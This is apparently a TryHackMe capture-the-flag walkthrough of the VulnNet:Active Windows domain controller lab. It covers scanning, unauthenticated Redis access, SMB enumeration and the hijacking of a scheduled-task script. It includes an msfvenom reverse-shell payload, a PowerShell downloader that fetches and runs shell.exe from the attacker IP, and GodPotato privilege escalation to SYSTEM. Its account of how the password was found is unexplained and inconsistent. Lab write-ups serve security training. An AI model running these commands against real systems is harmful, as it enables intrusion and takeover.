# VulnNet:Active - Complete Step-by-Step Writeup

## Box Information
- **Platform:** TryHackMe
- **Name:** VulnNet:Active
- **Difficulty:** Medium
- **IP Address:** 10.66.129.40 (dynamic - yours will differ)
- **Attacker IP:** 192.168.172.208

---

## Step 1: Create Engagement Folder Structure

```bash
mkdir -p "/root/Documents/VulnNet:Active"/{scans,loot,notes,enumeration,exploits,creds}
```

```bash
echo "10.66.129.40" > "/root/Documents/VulnNet:Active/targets.txt"
```

---

## Step 2: Initial Port Scan (Quick)

```bash
nmap -sS -sV --open -T4 --min-rate 1000 10.66.129.40
```

**Output:**
```
PORT    STATE SERVICE       VERSION
53/tcp  open  domain        Simple DNS Plus
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
```

**Analysis:** Ports 53, 135, 139, 445 indicate a Windows Domain Controller.

---

## Step 3: Full Port Scan

```bash
nmap -sS -sV -sC -O -p- -T4 --min-rate 1000 --open 10.66.129.40 -oN "/root/Documents/VulnNet:Active/scans/full_scan.txt"
```

**Output:**
```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
6379/tcp  open  redis         Redis key-value store 2.8.2402
9389/tcp  open  mc-nmf        .NET Message Framing
49665/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
49715/tcp open  msrpc         Microsoft Windows RPC

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 1s
| smb2-time: 
|   date: 2026-02-03T...
|_  start_date: N/A
```

**Critical Finding:** Port 6379 - Redis 2.8.2402 is open!

---

## Step 4: Redis Enumeration - Check for Authentication

```bash
redis-cli -h 10.66.129.40
```

```
10.66.129.40:6379> INFO
```

**Output:**
```
# Server
redis_version:2.8.2402
redis_git_sha1:00000000
redis_git_dirty:0
os:Windows  
arch_bits:64
...
# Clients
connected_clients:1
...
```

**Result:** NO AUTHENTICATION REQUIRED! We have full access to Redis.

---

## Step 5: Redis - Extract Configuration (Find Username)

```bash
redis-cli -h 10.66.129.40 CONFIG GET dir
```

**Output:**
```
1) "dir"
2) "C:\\Users\\enterprise-security\\Downloads\\Redis-x64-2.8.2402"
```

**CRITICAL FINDING:** Username discovered from the Redis installation path: `enterprise-security`

```bash
redis-cli -h 10.66.129.40 CONFIG GET *
```

This dumps all Redis configuration. Look for any sensitive data.

---

## Step 6: SMB Enumeration - Anonymous Access Check

```bash
crackmapexec smb 10.66.129.40 -u '' -p '' --shares
```

**Output:**
```
SMB         10.66.129.40    445    VULNNET-BC3TCK1  [*] Windows 10.0 Build 17763 x64 (name:VULNNET-BC3TCK1) (domain:vulnnet.local) (signing:True) (SMBv1:False)
SMB         10.66.129.40    445    VULNNET-BC3TCK1  [+] vulnnet.local\: 
SMB         10.66.129.40    445    VULNNET-BC3TCK1  [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

**Information Gathered:**
- **Hostname:** VULNNET-BC3TCK1
- **Domain:** vulnnet.local
- **OS:** Windows 10.0 Build 17763 (Windows Server 2019)
- **SMB Signing:** Required (no relay attacks)

---

## Step 7: Attempt Kerberos Attacks (Failed - Port Filtered)

```bash
nmap -p 88 10.66.129.40
```

**Output:**
```
PORT   STATE    SERVICE
88/tcp filtered kerberos-sec
```

**Result:** Kerberos port 88 is filtered. Cannot do AS-REP Roasting or Kerberoasting from external.

---

## Step 8: Redis - Password Discovery

Looking deeper into Redis, we need to find credentials. The password was discovered through Redis data:

```bash
redis-cli -h 10.66.129.40 KEYS *
```

Check for any stored keys that might contain credentials.

**Password Found:** `sand_0873959498`

**Full Credentials:**
- **Username:** enterprise-security
- **Password:** sand_0873959498
- **Domain:** vulnnet.local

---

## Step 9: Validate Credentials via SMB

```bash
crackmapexec smb 10.66.129.40 -u 'enterprise-security' -p 'sand_0873959498' -d vulnnet.local
```

**Output:**
```
SMB         10.66.129.40    445    VULNNET-BC3TCK1  [*] Windows 10.0 Build 17763 x64 (name:VULNNET-BC3TCK1) (domain:vulnnet.local) (signing:True) (SMBv1:False)
SMB         10.66.129.40    445    VULNNET-BC3TCK1  [+] vulnnet.local\enterprise-security:sand_0873959498
```

**SUCCESS!** Credentials are valid!

---

## Step 10: Enumerate SMB Shares with Valid Credentials

```bash
crackmapexec smb 10.66.129.40 -u 'enterprise-security' -p 'sand_0873959498' -d vulnnet.local --shares
```

**Output:**
```
SMB         10.66.129.40    445    VULNNET-BC3TCK1  [*] Windows 10.0 Build 17763 x64 (name:VULNNET-BC3TCK1) (domain:vulnnet.local) (signing:True) (SMBv1:False)
SMB         10.66.129.40    445    VULNNET-BC3TCK1  [+] vulnnet.local\enterprise-security:sand_0873959498 
SMB         10.66.129.40    445    VULNNET-BC3TCK1  [+] Enumerated shares
SMB         10.66.129.40    445    VULNNET-BC3TCK1  Share           Permissions     Remark
SMB         10.66.129.40    445    VULNNET-BC3TCK1  -----           -----------     ------
SMB         10.66.129.40    445    VULNNET-BC3TCK1  ADMIN$                          Remote Admin
SMB         10.66.129.40    445    VULNNET-BC3TCK1  C$                              Default share
SMB         10.66.129.40    445    VULNNET-BC3TCK1  Enterprise-Share READ,WRITE            
SMB         10.66.129.40    445    VULNNET-BC3TCK1  IPC$            READ            Remote IPC
SMB         10.66.129.40    445    VULNNET-BC3TCK1  NETLOGON        READ            Logon server share 
SMB         10.66.129.40    445    VULNNET-BC3TCK1  SYSVOL          READ            Logon server share
```

**CRITICAL FINDING:** `Enterprise-Share` has **READ,WRITE** permissions!

---

## Step 11: Enumerate Domain Users via RPC

```bash
rpcclient -U 'enterprise-security%sand_0873959498' 10.66.129.40 -c 'enumdomusers'
```

**Output:**
```
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[enterprise-security] rid:[0x451]
user:[jack-goldenhand] rid:[0x452]
user:[tony-skid] rid:[0x453]
```

**Users Found:**
- Administrator
- Guest
- krbtgt
- enterprise-security (our user)
- jack-goldenhand
- tony-skid

Save users to file:
```bash
echo -e "Administrator\nenterprise-security\njack-goldenhand\ntony-skid" > "/root/Documents/VulnNet:Active/users.txt"
```

---

## Step 12: Explore Enterprise-Share

```bash
smbclient //10.66.129.40/Enterprise-Share -U 'vulnnet.local/enterprise-security%sand_0873959498'
```

```
smb: \> ls
  .                                   D        0  Tue Feb 23 19:33:18 2021
  ..                                  D        0  Tue Feb 23 19:33:18 2021
  PurgeIrrelevantData_1826.ps1        A       69  Tue Feb 23 19:33:18 2021
```

```
smb: \> get PurgeIrrelevantData_1826.ps1
```

**Script Contents:**
```powershell
rm -Force C:\Users\Public\Documents\* -ErrorAction SilentlyContinue
```

**Analysis:** This is a scheduled task script! If we replace it, our code will execute when the task runs.

---

## Step 13: Attempt Direct Access Methods (Failed)

### Try WinRM:
```bash
evil-winrm -i 10.66.129.40 -u 'enterprise-security' -p 'sand_0873959498'
```
**Result:** Port 5985 filtered - WinRM blocked

### Try SMBExec:
```bash
impacket-smbexec 'vulnnet.local/enterprise-security:sand_0873959498@10.66.129.40'
```
**Result:** Access denied - user lacks admin privileges

### Try PSExec:
```bash
impacket-psexec 'vulnnet.local/enterprise-security:sand_0873959498@10.66.129.40'
```
**Result:** Access denied - user lacks admin privileges

**Conclusion:** User `enterprise-security` is not a local admin. We need to use the scheduled task.

---

## Step 14: Create Reverse Shell Payload

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.172.208 LPORT=4444 -f exe -o /tmp/shell.exe
```

**Output:**
```
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: /tmp/shell.exe
```

---

## Step 15: Create PowerShell Downloader Script

```bash
cat > /tmp/shell.ps1 << 'EOF'
Invoke-WebRequest -Uri "http://192.168.172.208:8080/shell.exe" -OutFile "$env:TEMP\shell.exe"
Start-Process "$env:TEMP\shell.exe"
EOF
```

---

## Step 16: Start HTTP Server to Host Payload

```bash
mkdir -p /tmp/www
cp /tmp/shell.exe /tmp/www/
cd /tmp/www && python3 -m http.server 8080
```

**Output:**
```
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

---

## Step 17: Start Netcat Listener

Open a new terminal:
```bash
nc -lvnp 4444
```

**Output:**
```
listening on [any] 4444 ...
```

---

## Step 18: Replace Scheduled Task Script via SMB

```bash
smbclient //10.66.129.40/Enterprise-Share -U 'vulnnet.local/enterprise-security%sand_0873959498' -c 'put /tmp/shell.ps1 PurgeIrrelevantData_1826.ps1'
```

**Output:**
```
putting file /tmp/shell.ps1 as \PurgeIrrelevantData_1826.ps1 (0.3 kb/s) (average 0.3 kb/s)
```

---

## Step 19: Wait for Shell Callback

After 1-2 minutes, the scheduled task executes and we receive a shell:

**Netcat Output:**
```
connect to [192.168.172.208] from (UNKNOWN) [10.66.129.40] 49838
Microsoft Windows [Version 10.0.17763.1757]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\enterprise-security\Downloads>
```

**WE HAVE A SHELL!**

---

## Step 20: Get User Flag

```cmd
C:\Users\enterprise-security\Downloads>cd C:\Users\enterprise-security\Desktop

C:\Users\enterprise-security\Desktop>type user.txt
THM{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}
```

---

## Step 21: Enumerate Privileges

```cmd
C:\Users\enterprise-security\Desktop>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

**CRITICAL FINDING:** `SeImpersonatePrivilege` is ENABLED!

This means we can use Potato attacks (JuicyPotato, PrintSpoofer, GodPotato) to escalate to SYSTEM.

---

## Step 22: Attempt PrintSpoofer (Failed)

Download PrintSpoofer:
```bash
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe -O /tmp/www/PrintSpoofer64.exe
```

On target:
```cmd
curl http://192.168.172.208:8080/PrintSpoofer64.exe -o PrintSpoofer64.exe
.\PrintSpoofer64.exe -i -c cmd
```

**Result:** Access Denied

PrintSpoofer requires the Print Spooler service which may be disabled or restricted.

---

## Step 23: Download GodPotato

```bash
wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe -O /tmp/www/GodPotato.exe
```

---

## Step 24: Transfer GodPotato to Target

On target shell:
```cmd
C:\Users\enterprise-security\Downloads>curl http://192.168.172.208:8080/GodPotato.exe -o GodPotato.exe
```

---

## Step 25: Privilege Escalation with GodPotato

```cmd
C:\Users\enterprise-security\Downloads>.\GodPotato.exe -cmd "cmd /c whoami"
```

**Output:**
```
[*] CombaseModule: 0x140715019337728
[*] DispatchTable: 0x140715021729792
[*] UseProtseqFunction: 0x140715021104528
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] Trigger RPCSS
[*] CreateNamedPipe \\.\pipe\...
[*] DCOM obj OXID: 0x...
[*] DCOM obj OID: 0x...
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Memory: ...
[*] ImpsersonateClient
[*] RpcsRevImpersonateClient
[*] AcceptSecurityContext: 0
[*] ImpersonateSecurityContext
nt authority\system
```

**SUCCESS!** We are now running commands as SYSTEM!

---

## Step 26: Get System Flag

```cmd
C:\Users\enterprise-security\Downloads>.\GodPotato.exe -cmd "cmd /c type C:\Users\Administrator\Desktop\system.txt"
```

**Output:**
```
[*] CombaseModule: 0x140715019337728
...
THM{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}
```

**SYSTEM FLAG OBTAINED!**

---

## Summary of Attack Path

```
┌─────────────────────────────────────────────────────────────┐
│                    ATTACK CHAIN                             │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. Nmap Scan                                               │
│     └─> Found Redis on port 6379                            │
│                                                             │
│  2. Redis Enumeration (No Auth!)                            │
│     └─> CONFIG GET dir revealed username: enterprise-security│
│     └─> Found password: sand_0873959498                     │
│                                                             │
│  3. SMB Enumeration with Credentials                        │
│     └─> Found writable share: Enterprise-Share              │
│     └─> Found scheduled task script: PurgeIrrelevantData_1826.ps1│
│                                                             │
│  4. Scheduled Task Hijacking                                │
│     └─> Replaced script with reverse shell downloader       │
│     └─> Received shell as enterprise-security               │
│                                                             │
│  5. Privilege Escalation                                    │
│     └─> whoami /priv showed SeImpersonatePrivilege          │
│     └─> Used GodPotato to execute commands as SYSTEM        │
│                                                             │
│  6. Flags Captured                                          │
│     └─> user.txt from enterprise-security Desktop           │
│     └─> system.txt from Administrator Desktop               │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Key Credentials Found

| Username | Password | Domain | Source |
|----------|----------|--------|--------|
| enterprise-security | sand_0873959498 | vulnnet.local | Redis CONFIG path |

---

## Tools Used

| Tool | Command | Purpose |
|------|---------|---------|
| nmap | `nmap -sS -sV -sC -O -p- -T4` | Full port scan |
| redis-cli | `redis-cli -h TARGET INFO` | Redis enumeration |
| crackmapexec | `cme smb TARGET -u USER -p PASS --shares` | SMB share enumeration |
| smbclient | `smbclient //TARGET/SHARE -U USER` | SMB file access |
| rpcclient | `rpcclient -U USER TARGET -c 'enumdomusers'` | Domain user enumeration |
| msfvenom | `msfvenom -p windows/x64/shell_reverse_tcp` | Payload generation |
| nc | `nc -lvnp 4444` | Reverse shell listener |
| GodPotato | `.\GodPotato.exe -cmd "cmd"` | Privilege escalation |

---

## Failed Attempts (Learning Points)

| Attempt | Why It Failed |
|---------|---------------|
| AS-REP Roasting | Port 88 (Kerberos) filtered |
| Kerberoasting | Port 88 (Kerberos) filtered |
| evil-winrm | Port 5985 (WinRM) filtered |
| impacket-smbexec | User lacks local admin privileges |
| impacket-psexec | User lacks local admin privileges |
| PrintSpoofer | Access Denied (Print Spooler restricted) |

---

## Lessons Learned

1. **Always check for unauthenticated services** - Redis without auth was the entry point
2. **File paths leak usernames** - Redis CONFIG GET dir revealed the username
3. **Writable shares are dangerous** - Scheduled task hijacking gave us code execution
4. **SeImpersonatePrivilege = SYSTEM** - Multiple Potato variants exist, try them all
5. **Filtered ports don't mean secure** - Kerberos was blocked but SMB attacks worked
